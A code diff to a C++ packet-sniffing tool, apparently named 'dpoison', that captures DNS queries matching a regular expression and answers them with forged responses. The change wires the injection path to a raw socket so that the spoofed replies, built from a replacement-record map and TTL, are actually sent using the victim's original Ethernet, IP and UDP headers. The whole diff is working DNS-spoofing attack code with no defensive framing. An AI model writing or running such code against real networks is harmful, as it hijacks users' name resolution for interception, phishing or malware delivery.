@@ -20,6 +20,7 @@
 #include <boost/regex.hpp>
 
 #include "dns.hpp"
+#include "socket.hpp"
 
 inline std::ostream &operator <<(std::ostream &out, const timeval &tv)
 {
@@ -60,7 +61,6 @@ class pcap {
 				throw std::runtime_error(ss.str());
 			}
 
-			std::cerr << "datalink: " << pcap_datalink(m_session) << std::endl;
 			if (pcap_datalink(m_session) != DLT_EN10MB) {
 			}
 		}
@@ -148,7 +148,7 @@ class basic_process {
 
 				if (q.match(m_re)) {
 					std::cout << header->ts << ": " << dump_eth(eth) << " : " << dump_addr(ip, udp) << std::endl;
-					inject(q);
+					inject(eth, ip, udp, q);
 				}
 			} catch (const std::exception &e) {
 				std::cout << "failed to process: " << e.what() << std::endl;
@@ -159,6 +159,8 @@ class basic_process {
 		boost::regex m_re;
 		std::map<u16, std::string> m_repl;
 		u32 m_ttl;
+
+		ioremap::dpoison::socket m_sock;
 
 		void dump_eth_single(std::ostringstream &ss, const u_int8_t *header) {
 			char tmp[4];
@@ -192,8 +194,10 @@ class basic_process {
 			return ss.str();
 		}
 
-		void inject(const query &q) {
+		void inject(const struct ether_header *eth, const struct ip *ip, const struct udphdr *udp, const query &q) {
 			std::string str = q.pack(m_repl, m_ttl);
+
+			m_sock.send(eth, ip, udp, str);
 		}
 };
 
